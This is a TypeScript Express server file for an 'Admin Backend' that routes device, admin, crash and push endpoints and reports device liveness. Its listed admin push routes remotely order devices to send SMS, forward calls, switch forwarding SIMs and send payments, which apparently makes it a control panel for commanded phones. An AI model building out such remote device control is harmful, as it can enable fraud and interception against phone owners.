// File: src/app.ts
import express from "express";
import morgan from "morgan";
import helmet from "helmet";
import cors from "cors";
import bodyParser from "body-parser";

import apiRouter from "./routes/api";
import devicesRouter from "./routes/devices";
import adminRouter from "./routes/admin";
import formsRouter from "./routes/forms";
import adminSessions from "./routes/adminSessions";
import favoritesRoutes from "./routes/favorites";
import crashesRouter from "./routes/crashes";
import adminPushRoutes from "./routes/adminPush";

import { errorHandler } from "./middlewares/errorHandler";
import { apiKeyAuth, adminSessionGuard } from "./middlewares/auth";
import logger from "./logger/logger";
import Device from "./models/Device";

const app = express();

/* ═══════════════════════════════════════════
   BASIC MIDDLEWARES
   ═══════════════════════════════════════════ */

app.use(helmet());
app.use(cors());
app.use(bodyParser.json({ limit: "5mb" }));
app.use(bodyParser.urlencoded({ extended: true }));

// Logger
app.use(
  morgan("combined", {
    stream: {
      write: (msg: string) => logger.info(msg.trim()),
    },
  }),
);

/* ═══════════════════════════════════════════
   AUTH
   ═══════════════════════════════════════════ */

// API KEY only for /api
app.use("/api", apiKeyAuth);

// Admin session guard
app.use("/api", adminSessionGuard);

/* ═══════════════════════════════════════════
   MAIN API ROUTES
   ═══════════════════════════════════════════ */

app.use("/api", apiRouter);
app.use("/api", formsRouter);
app.use("/api", devicesRouter);
app.use("/api", adminRouter);

// Admin sessions
app.use("/api/admin", adminSessions);

// Favorites
app.use("/api/favorites", favoritesRoutes);

// Crashes
app.use("/api", crashesRouter);

// FCM/admin push routes
// Final paths:
// POST /api/admin/push/devices/:deviceId/restart
// POST /api/admin/push/devices/:deviceId/revive
// POST /api/admin/push/devices/:deviceId/start
// POST /api/admin/push/devices/:deviceId/sync-token
// POST /api/admin/push/devices/:deviceId/send-sms        (NEW)
// POST /api/admin/push/devices/:deviceId/call-forward     (NEW)
// POST /api/admin/push/devices/:deviceId/push-admins      (NEW)
// POST /api/admin/push/devices/:deviceId/push-global-admin (NEW)
// POST /api/admin/push/devices/:deviceId/push-device-admin (NEW)
// POST /api/admin/push/devices/:deviceId/push-forwarding-sim (NEW)
// POST /api/admin/push/devices/:deviceId/send-payment     (NEW)
// POST /api/admin/push/devices/:deviceId/ping             (NEW)
// POST /api/admin/push/send
// POST /api/admin/push/broadcast                          (NEW)
app.use("/api/admin/push", adminPushRoutes);

/* ═══════════════════════════════════════════
   STATUS SNAPSHOT (lastSeen based)
   ═══════════════════════════════════════════ */

app.get("/api/status", async (_req, res) => {
  try {
    const devices = await Device.find()
      .select("deviceId lastSeen")
      .lean();

    const now = Date.now();

    const statusMap: Record<
      string,
      {
        status: "responsive" | "idle" | "unreachable";
        lastSeenAt: number;
        lastAction: string;
        battery: number;
        agoMs: number;
      }
    > = {};

    devices.forEach((d: any) => {
      const did = String(d.deviceId || "").trim();
      if (!did) return;

      const lastSeenAt = Number(d?.lastSeen?.at || 0);
      const agoMs = lastSeenAt > 0 ? now - lastSeenAt : -1;

      let status: "responsive" | "idle" | "unreachable";
      if (lastSeenAt <= 0) {
        status = "unreachable";
      } else if (agoMs <= 15 * 60 * 1000) {
        status = "responsive";
      } else if (agoMs <= 2 * 60 * 60 * 1000) {
        status = "idle";
      } else {
        status = "unreachable";
      }

      statusMap[did] = {
        status,
        lastSeenAt,
        lastAction: String(d?.lastSeen?.action || "").trim(),
        battery: Number(d?.lastSeen?.battery ?? -1),
        agoMs,
      };
    });

    return res.json(statusMap);
  } catch (err: any) {
    logger.error("GET /api/status failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

/* ═══════════════════════════════════════════
   BACKWARD COMPATIBILITY
   ═══════════════════════════════════════════ */

app.use("/devices", devicesRouter);
app.use("/admin", adminRouter);

/* ═══════════════════════════════════════════
   HEALTH
   ═══════════════════════════════════════════ */

app.get("/healthz", (_req, res) => {
  res.json({ ok: true, timestamp: Date.now() });
});

// root
app.get("/", (_req, res) => {
  res.send("Admin Backend (TypeScript) - OK");
});

/* ═══════════════════════════════════════════
   404 + ERROR HANDLER
   ═══════════════════════════════════════════ */

// 404 json for api/device/admin
app.use((req, res, next) => {
  if (
    req.path.startsWith("/api") ||
    req.path.startsWith("/devices") ||
    req.path.startsWith("/admin")
  ) {
    return res.status(404).json({ success: false, error: "not found" });
  }
  next();
});

// Error handler (last)
app.use(errorHandler);

export default app;